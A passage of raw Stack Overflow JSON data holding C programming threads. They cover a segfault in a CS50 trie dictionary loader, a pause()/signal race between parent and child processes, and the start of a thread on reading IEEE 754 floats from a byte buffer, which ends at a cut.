Yes. I see. :)"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459345781, "post_id": 36310496, "comment_id": 60244914, "body": "One problem in the code is that the 27 child node pointers are not explicitly initialised to null after allocating them."}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459345815, "post_id": 36310496, "comment_id": 60244942, "body": "@MOehm since *ptr is junk when first created, doesn&#39;t the first allocation have to be sizeof(node)? then this line:  ptr-&gt;next[ch] = malloc(sizeof(node)); could become sizeof(*ptr) instead."}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459345868, "post_id": 36310496, "comment_id": 60244991, "body": "@MOehm doesnt my first for loop initialize them to null?"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 1, "creation_date": 1459345873, "post_id": 36310496, "comment_id": 60244997, "body": "<code>for (char c = fgetc(dict); c!=EOF; c = fgetc(dict))</code> should be <code>for (int c = fgetc(dict); c!=EOF; c = fgetc(dict))</code>. You cannot portably compare a <code>char</code> with <code>EOF</code> because the <code>EOF</code> value might not be representable by a <code>char</code> value."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1459345882, "post_id": 36310496, "comment_id": 60245000, "body": "<code>struct node* next[27];</code> Eeeh? Why is this variable called next? I thought this was some sort of linked list? What&#39;s &quot;next&quot; supposed to be, some sort of look-up table? Is this a chained linked list? Hash table?"}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "edited": false, "score": 0, "creation_date": 1459345971, "post_id": 36310496, "comment_id": 60245078, "body": "It&#39;s a trie, so each node has pointers to 27 other arrays (one for each letter of the alphabet and an apostrophe) as well as a switch that tells you whether a word ends here"}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459345995, "post_id": 36310496, "comment_id": 60245099, "body": "@IanAbbot thanks will update to reflect"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459346022, "post_id": 36310496, "comment_id": 60245119, "body": "The <code>sizeof</code> operator doesn&#39;t look at the contents of <code>*ptr</code>, only its type. Of course, seeing <code>*ptr</code> when <code>ptr</code> hasn&#39;t been initialised should make you suspicious, but it is safe to run <code>sizeof(*ptr)</code>, which will give you <code>sizeof(node)</code> regardless of its contents."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459346141, "post_id": 36310496, "comment_id": 60245231, "body": "@murtaza64: Your first loopinitialises only  the root node&#39;s children to <code>NULL</code>. Every time you allocate new memory, you create a new uninitialised object. Perhaps it is better to write a constructor function <code>node_new</code> that allocates and initialises the node."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459346257, "post_id": 36310496, "comment_id": 60245338, "body": "Also: What happens to the trie? You don&#39;t return it; it just goes out of scope at the end of the function."}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459346286, "post_id": 36310496, "comment_id": 60245363, "body": "@MOehm check the OP please--is this correct?"}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459346375, "post_id": 36310496, "comment_id": 60245440, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/107751/discussion-between-murtaza64-and-m-oehm\">continue this discussion in chat</a>."}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "edited": false, "score": 0, "creation_date": 1459346566, "post_id": 36310496, "comment_id": 60245622, "body": "LENGTH has been defined as 45 (longest word in dict)"}, {"owner": {"reputation": 538, "user_id": 1665886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e1ddc9e7284c08982437f63fcf0e2d?s=128&d=identicon&r=PG", "display_name": "CarlH", "link": "https://stackoverflow.com/users/1665886/carlh"}, "edited": false, "score": 0, "creation_date": 1459346770, "post_id": 36310496, "comment_id": 60245795, "body": "When the debugger fails you and the brain is foggy, do the crude and old-school thing of putting printf&#39;s in your code, e.g., make sure you&#39;re not overrunning your arrays (are you sure index is always &lt;27?), sanity check values of everything - easily done and might surprise you."}, {"owner": {"reputation": 21281, "user_id": 1122645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/mrljv.png?s=128&g=1", "display_name": "UmNyobe", "link": "https://stackoverflow.com/users/1122645/umnyobe"}, "reply_to_user": {"reputation": 538, "user_id": 1665886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e1ddc9e7284c08982437f63fcf0e2d?s=128&d=identicon&r=PG", "display_name": "CarlH", "link": "https://stackoverflow.com/users/1665886/carlh"}, "edited": false, "score": 0, "creation_date": 1459346830, "post_id": 36310496, "comment_id": 60245847, "body": "@CarlH the debugger hasn&#39;t failed him. He just doesnt know how to use it."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459346901, "post_id": 36310496, "comment_id": 60245910, "body": "One more issue: the reading of one work is wrong, the resulting string in the <code>word</code> array is not zero terminated."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459347484, "post_id": 36310496, "comment_id": 60246425, "body": "@murtaza64 please: next time you ask a question on stackoverflow include directly all relevant information in the question. There have been too many comments asking your for information you should have included into your question from start. <a href=\"http://stackoverflow.com/help/mcve\">Read also this</a>."}, {"owner": {"reputation": 538, "user_id": 1665886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e1ddc9e7284c08982437f63fcf0e2d?s=128&d=identicon&r=PG", "display_name": "CarlH", "link": "https://stackoverflow.com/users/1665886/carlh"}, "reply_to_user": {"reputation": 21281, "user_id": 1122645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/mrljv.png?s=128&g=1", "display_name": "UmNyobe", "link": "https://stackoverflow.com/users/1122645/umnyobe"}, "edited": false, "score": 0, "creation_date": 1459347554, "post_id": 36310496, "comment_id": 60246494, "body": "@UmNyobe - Yes, most likely, hence the foggy brain caveat!  Point is still valid, though - sometimes something as silly as a printf is simpler and faster than the more obvious and conventional methods."}], "answers": [{"comments": [{"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "edited": false, "score": 0, "creation_date": 1459346715, "post_id": 36311176, "comment_id": 60245757, "body": "Thanks, this was an issue, but the segfault was occurring even before I implemented this function"}], "tags": [], "owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "is_accepted": false, "score": 3, "last_activity_date": 1459346775, "last_edit_date": 1459346775, "creation_date": 1459346549, "answer_id": 36311176, "question_id": 36310496, "link": "https://stackoverflow.com/questions/36310496/can-someone-help-me-find-the-segfault-here/36311176#36311176", "title": "Can someone help me find the segfault here?", "body": "<p>The line:</p>\n\n<pre><code>node* ptr = new_node;\n</code></pre>\n\n<p>and </p>\n\n<pre><code>ptr-&gt;next[ch] = new_node;\n</code></pre>\n\n<p>are not calling the function, but assigning the address of the function to <code>ptr</code>. Call the function instead. </p>\n\n<p>This problem could have been prevented if compiler warnings: <code>-Wall</code> and <code>-Wextra</code> were enabled.</p>\n\n<hr>\n\n<p>There is no bounds checking done on the array <code>word</code>. Use the value <code>LENGTH</code> to check if the index is in bounds before using it.</p>\n\n<p>It isn't clear what the if statement inside the for loop is doing. It appears that every time a newline is found the whole array <code>word</code> is added to the tree, but the <code>index</code> isn't reset so the same array is added multiple times. At some point <code>index</code> will point out of bounds causing undefined behavior. You should reset <code>index</code> after you use the array <code>word</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1589, "user_id": 5944798, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7532aec0ae828a8c2e98970b40fd1cc7?s=128&d=identicon&r=PG&f=1", "display_name": "Julien Lopez", "link": "https://stackoverflow.com/users/5944798/julien-lopez"}, "is_accepted": false, "score": 3, "last_activity_date": 1459347457, "last_edit_date": 1459347457, "creation_date": 1459346988, "answer_id": 36311373, "question_id": 36310496, "link": "https://stackoverflow.com/questions/36310496/can-someone-help-me-find-the-segfault-here/36311373#36311373", "title": "Can someone help me find the segfault here?", "body": "<p>You forgot to reset <code>index</code> to <code>0</code> at the beginning of the loop.</p>\n\n<p>You should also use <code>calloc(1, sizeof(node))</code> instead of <code>malloc(sizeof(node))</code> to avoid leaving memory uninitialized. I suggest you use <a href=\"http://valgrind.org/\" rel=\"nofollow\">valgrind</a> to help you track problems of this kind in your code.</p>\n"}, {"comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "edited": false, "score": 0, "creation_date": 1459347936, "post_id": 36311531, "comment_id": 60246842, "body": "Good. As I said: The segfault and memory errors are gone, but I haven&#39;t checked whether the code works properly."}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "edited": false, "score": 0, "creation_date": 1459351608, "post_id": 36311531, "comment_id": 60249743, "body": "I finished the problem and managed to get the entire spellchecker working only 0.01 second slower than the cs50 staff&#39;s example. Now to shave that off too."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "edited": false, "score": 0, "creation_date": 1459353524, "post_id": 36311531, "comment_id": 60251268, "body": "Good! But 0.01 seconds may well be a measuring inaccuracy. And focus on correctness first: A fast program that produces wrong results isn&#39;t worth much. <code>:)</code>"}], "tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": true, "score": 4, "last_activity_date": 1459347297, "creation_date": 1459347297, "answer_id": 36311531, "question_id": 36310496, "link": "https://stackoverflow.com/questions/36310496/can-someone-help-me-find-the-segfault-here/36311531#36311531", "title": "Can someone help me find the segfault here?", "body": "<p>You have many issues in your code:</p>\n\n<ul>\n<li><p>When you allocate memory with <code>malloc</code>, it is uninitialised. initialise it directly after allocating it, so that <code>NULL</code> pointers really are null. (<code>calloc</code>, a cousin of \u00b4malloc\u00b4, initialises all memory to zero.)</p></li>\n<li><p>When you loop over the word, you should nor include <code>index</code>:</p>\n\n<pre><code>for (int x = 0; x &lt; index; x++) ...\n</code></pre></li>\n<li><p>When you have found the end of a word, you must reset the <code>index</code> to 0. Otherwise, you will append to the old word and overflow the buffer. (You should probably also enforce the upper bound of \u00b4index\u00b4.)</p></li>\n<li><p>Likewise, when you insert a word into the trie, you must reset your pointer for trie traversal to the trie's root. You need two pointers here: A root node pointer and an auxiliary pointer for traversing the trie.</p></li>\n<li><p>As is, your trie is local to your function. Return the root node, so that other functions can use the trie, or <code>NULL</code> on failure.</p></li>\n</ul>\n\n<p>Fix these, and you will have a non-crashing function. (It still leaks memory and may not construct the trie properly.)</p>\n\n<pre><code>    node *load(const char *dictionary)\n    {\n        FILE *dict = fopen(dictionary, \"r\");\n        node *head = calloc(1, sizeof(node));\n\n        char word[LENGTH + 1];\n        int index = 0;\n\n        for (int c = fgetc(dict); c != EOF; c = fgetc(dict)) {\n            if (c != '\\n') {\n                word[index] = c;\n                index++;\n            } else {\n                node *ptr = head;\n\n                for (int x = 0; x &lt; index; x++) {\n                    int ch = (word[x] == '\\'') ? 26 : tolower(word[x]) - 'a';\n                    if (ptr-&gt;next[ch] == NULL) {\n                        ptr-&gt;next[ch] = calloc(1, sizeof(node));\n                    }\n                    ptr = ptr-&gt;next[ch];\n                }\n                ptr-&gt;end = true;\n                index = 0;\n            }\n        }\n\n        return head;\n    }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 21281, "user_id": 1122645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/mrljv.png?s=128&g=1", "display_name": "UmNyobe", "link": "https://stackoverflow.com/users/1122645/umnyobe"}, "is_accepted": false, "score": 2, "last_activity_date": 1459347539, "creation_date": 1459347539, "answer_id": 36311633, "question_id": 36310496, "link": "https://stackoverflow.com/questions/36310496/can-someone-help-me-find-the-segfault-here/36311633#36311633", "title": "Can someone help me find the segfault here?", "body": "<p>You should filter punctuation\\unsupported characters a bit more. Any character outside of <code>[a-z|A-Z|\\n|\\\\]</code> will crash your program because of </p>\n\n<pre><code>int ch = (word[x] == '\\'') ? 26 : tolower(word[x])-'a';\nif (ptr-&gt;next[ch] == NULL){\n</code></pre>\n\n<p>Given that you open a file, there might be a space somewhere or some unexpected character. You need something like</p>\n\n<pre><code>    if(c!='\\n'){\n        int num = (c == '\\'') ? 26 : tolower(c)-'a');\n        if(num &gt;=0 &amp;&amp; num &lt; 27)\n        {\n           word[index]=c;\n           index++;\n        }\n    }\n</code></pre>\n"}], "owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 107, "favorite_count": 0, "accepted_answer_id": 36311531, "answer_count": 4, "score": 2, "last_activity_date": 1459347539, "creation_date": 1459344955, "last_edit_date": 1459347075, "question_id": 36310496, "link": "https://stackoverflow.com/questions/36310496/can-someone-help-me-find-the-segfault-here", "title": "Can someone help me find the segfault here?", "body": "<p>EDIT: So, it turns out that 'index' was not being returned to 0. Well then. That fixed one segfault. But still getting a different segfault. Working on it.</p>\n\n<pre><code>node* new_node(void){\n    node* ptr = malloc(sizeof(node));\n    for (int i = 0; i&lt;27; i++) {\n        ptr-&gt;next[i] = NULL;\n    }\n    return ptr;\n}\nbool load(const char* dictionary)\n{\n    FILE* dict = fopen(dictionary, \"r\");\n    node* ptr = new_node;\n    char word[LENGTH+1];\n    int index = 0;\n    for (int c = fgetc(dict); c!=EOF; c = fgetc(dict)){\n        if(c!='\\n'){\n            word[index]=c;\n            index++;\n        }\n        else {\n            for(int x=0; x&lt;=index; x++){\n                int ch = (word[x] == '\\'') ? 26 : tolower(word[x])-'a';\n                if (ptr-&gt;next[ch] == NULL){\n                    ptr-&gt;next[ch] = new_node;\n                }\n                ptr = ptr-&gt;next[ch];\n            }\n            ptr-&gt;end=true;\n        }\n    }\n    return true;\n}\n</code></pre>\n\n<p>I'm trying to implement a trie data structure for a dictionary but my program seems to segfault somewhere in this function. I can't seem to pin it down even with the help of GDB, so can someone give me a hand?</p>\n\n<p>Node is defined as such:</p>\n\n<pre><code>typedef struct node{\n    bool end;\n    struct node* next[27];\n} node;\n</code></pre>\n\n<p>Dictionary file:</p>\n\n<pre><code>a\naaa\naaas\naachen\naalborg\naalesund\naardvark\naardvark's\naardvarks\naardwolf\n</code></pre>\n\n<p>(...)</p>\n"}, {"tags": ["c", "linux", "signals"], "answers": [{"tags": [], "owner": {"reputation": 1156, "user_id": 4772791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e9e0e4bd022920a359eac1b22749ca6?s=128&d=identicon&r=PG&f=1", "display_name": "arsv", "link": "https://stackoverflow.com/users/4772791/arsv"}, "is_accepted": true, "score": 2, "last_activity_date": 1459369470, "last_edit_date": 1459369470, "creation_date": 1459367925, "answer_id": 36318552, "question_id": 36310437, "link": "https://stackoverflow.com/questions/36310437/child-process-still-does-not-run-after-receiving-signal/36318552#36318552", "title": "Child process still does not run after receiving signal", "body": "<p>pause() gets invoked <em>after</em> the signal has been received and handled by the child.  Unfortunately, <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/pause.html#tag_16_359_07\" rel=\"nofollow\">pause() easily introduces this kind of race condition</a>:</p>\n\n<pre><code>time you parent                   child\n---- --- ------                   -----\n  0      signal(SIGINT,handler)\n  1      fork()                   (hello)\n  2      print(\"Parent\")          (waking up)\n  3      kill(..., SIGINT)        &lt;&lt;SIGINT&gt;&gt;               # RACE kill v pause\n  4                               handler: print(\"Caught\")\n  5      pause()                  pause()\n  6   ^C &lt;&lt;SIGINT&gt;&gt;               &lt;&lt;SIGINT&gt;&gt;\n  7      handler: print(\"Caught\") handler: print(\"Caught\")\n  8      exit                     pause()\n  9                               (still running)\n</code></pre>\n\n<p>To check what exactly goes on, try adding %i, getpid() to printfs, and maybe also one more printf() before the pause() call in the child branch.</p>\n\n<p><a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/sigsuspend.html#\" rel=\"nofollow\">sigsuspend()</a> and explicit signal masking might be a better choice here.</p>\n"}], "owner": {"reputation": 3063, "user_id": 4133947, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/99688fdb4523347fb5e789c3705350d4?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/4133947/robert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "accepted_answer_id": 36318552, "answer_count": 1, "score": 1, "last_activity_date": 1459369470, "creation_date": 1459344801, "last_edit_date": 1495535308, "question_id": 36310437, "link": "https://stackoverflow.com/questions/36310437/child-process-still-does-not-run-after-receiving-signal", "title": "Child process still does not run after receiving signal", "body": "<p>The code is one of the answers to <a href=\"https://stackoverflow.com/questions/7546828/why-doesnt-child-process-continue-running-after-receiving-signal\">this question</a>.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;signal.h&gt;\n\n\nvoid\nsigusr1( int pidno )\n{\n  fprintf(stderr, \"Caught\\n\");\n}\n\nint\nmain()\n{\n  pid_t pid;\n\n  signal( SIGINT, sigusr1 );\n  if( (pid = fork()) == 0 ){\n    pause();\n    fprintf(stderr, \"Child\\n\");\n  }\n  else\n  {\n    fprintf(stderr, \"Parent\\n\");\n    kill( pid , SIGINT ); //parent sends signal to child\n  }\n  pause();\n  return 0;\n}\n</code></pre>\n\n<p>The child waits for a signal, and after receiving it continues execution.</p>\n\n<p>Running it I get</p>\n\n<pre><code>Parent\nCaught\n</code></pre>\n\n<p>It seems that the child does not runs after receiving the signal. Pressing Ctrl+c:</p>\n\n<pre><code>Parent\nCaught\n^CCaught\nCaught\nChild\n</code></pre>\n\n<p>Can somebody explain me what is happening here?</p>\n"}, {"tags": ["c", "floating-point", "format", "ieee-754"], "comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1459346105, "post_id": 36310341, "comment_id": 60245200, "body": "Surfing Google for a few minutes, I was able to find <i><a href=\"http://www.technical-recipes.com/2012/converting-between-binary-and-decimal-representations-of-ieee-754-floating-point-numbers-in-c/\" rel=\"nofollow noreferrer\">this post</a></i>, and several others that talk about converting IEEE 754 binary to float etc."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1459346314, "post_id": 36310341, "comment_id": 60245390, "body": "i&#39;ve found that too... doesn&#39;t solve my problem... this is basicaly about converting float to dec. Or mabye I missunderstood it, so correct me"}], "answers": [{"comments": [{"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459346644, "post_id": 36311108, "comment_id": 60245698, "body": "@chux Fixed. Thanks."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1459347057, "post_id": 36311108, "comment_id": 60246047, "body": "ok, thanks! I dont understand what you mean by correctly aligned buffer, could you explain it more, please?"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 1, "creation_date": 1459347379, "post_id": 36311108, "comment_id": 60246343, "body": "@Charlestone Many CPUs have limitations that, for example, 32-bit type has to start from address which is divisible by 4, and 16-bit type divisible by 2. When you dereference from random location of buffer, it may be incorrectly aligned. This is one of the reasons why aliasing different pointer types is mostly illegal in C. Use casting with care, because it will disable any compiler warnings these cases."}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1459807689, "post_id": 36311108, "comment_id": 60443080, "body": "ok, but the thing is, that the location is NOT random, I exactly know where the bytes I want begin (I read binary data from serial port with exactly specified order). My colleague told me to do the thing with the pointers, because it&#39;s easier to read. Is it save then?"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1459843011, "post_id": 36311108, "comment_id": 60455288, "body": "@Charlestone No, it&#39;s still not safe. <code>uint8_t buffer</code> can be aligned anywhere. You can use compiler specific tricks to align buffer manually, or you can be on system where unaligned access only incurs performance penalty. <i>But even then,</i> there is possibility that compiler optimizations, which rely on strict aliasing, break your code. Your collague is lacking information on this area: It&#39;s not about which code is easier to read, it&#39;s about what is right and wrong. I have had one hard to track bug caused by this. Use <code>memcpy</code>, it is simple and it works."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1459843565, "post_id": 36311108, "comment_id": 60455612, "body": "@Charlestone If you are interested in making code clean, I would recommend moving the copy to utility functions like 